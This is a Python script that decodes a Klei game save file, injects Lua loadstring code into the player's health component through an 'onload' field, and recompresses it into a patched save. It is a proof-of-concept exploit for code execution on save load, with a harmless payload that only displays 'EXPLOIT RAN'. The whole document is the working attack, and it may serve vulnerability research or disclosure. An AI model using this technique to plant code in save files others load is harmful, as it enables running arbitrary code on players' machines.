#!/usr/bin/env python3
import os, base64, zlib, struct

SAVE_INPUT    = 'save/SAVE/survival_1'
OUTPUT        = 'build/survival_1_patched'

os.makedirs('build', exist_ok=True)

with open(SAVE_INPUT, 'rb') as f:
    raw = f.read()

MAGIC = b'KLEI     1D'
assert raw[:11] == MAGIC

decoded = base64.b64decode(raw[11:])
v1, v2, uncompressed_len, compressed_len = struct.unpack_from('<4I', decoded, 0)
data = zlib.decompress(decoded[0x10:])
print(f"[*] Unpacked: {len(data)} bytes")

# Replace only the first occurrence
old = b'health={health=150}'
new = b'health={health=150,onload="local f=loadstring([[DisplayError(EXPLOIT RAN)]]) if f then f() end"}'

if old not in data:
    print("[!] health={health=150} not found")
    exit(1)

data = data.replace(old, new, 1)
print("[*] Replaced player health component")

# Recompress
best, best_lvl = None, -1
for level in range(1, 10):
    candidate = zlib.compress(data, level)
    if best is None or abs(len(candidate) - compressed_len) < abs(len(best) - compressed_len):
        best, best_lvl = candidate, level

new_compressed = best
print(f"[*] Compression level: {best_lvl}")

new_enc_hdr = struct.pack('<4I', v1, v2, len(data), len(new_compressed))
new_b64 = base64.b64encode(new_enc_hdr + new_compressed)
output = MAGIC + new_b64

with open(OUTPUT, 'wb') as f:
    f.write(output)

print(f"[+] Done: {OUTPUT} ({len(output)} bytes)")
